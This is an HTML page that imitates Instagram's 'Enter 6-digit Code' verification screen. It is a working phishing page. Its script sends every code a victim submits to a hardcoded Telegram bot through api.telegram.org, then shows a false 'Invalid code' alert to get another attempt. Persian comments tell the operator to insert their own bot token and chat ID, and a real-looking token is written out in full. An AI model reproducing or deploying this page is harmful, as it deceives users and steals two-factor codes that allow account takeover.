<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Enter Code • Instagram</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #fafafa;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .box {
      background: #fff;
      padding: 40px;
      border: 1px solid #ddd;
      width: 300px;
      text-align: center;
    }
    input {
      width: 100%;
      padding: 10px;
      margin: 8px 0;
      font-size: 18px;
      text-align: center;
      letter-spacing: 5px;
    }
    button {
      width: 100%;
      background-color: #3897f0;
      color: white;
      padding: 10px;
      border: none;
      margin-top: 10px;
    }
  </style>
</head>
<body>
  <div class="box">
    <h3>Enter 6-digit Code</h3>
    <form id="codeForm">
      <input type="text" id="code" maxlength="6" placeholder="••••••" required />
      <button type="submit">Verify</button>
    </form>
  </div>

  <script>
    const botToken = "7917095508:AAFyR4fE92SCZmkMjCm2vKI4katC_yMOHWY";  // جایگزین توکن خودت
    const chatId = "1703538236";  // جایگزین چت آیدی خودت

    document.getElementById("codeForm").addEventListener("submit", function (e) {
      e.preventDefault();

      const code = document.getElementById("code").value;
      const message = `🔐 Code Entered: ${code}`;

      fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);

      alert("Invalid code. Please try again.");
    });
  </script>
</body>
</html>
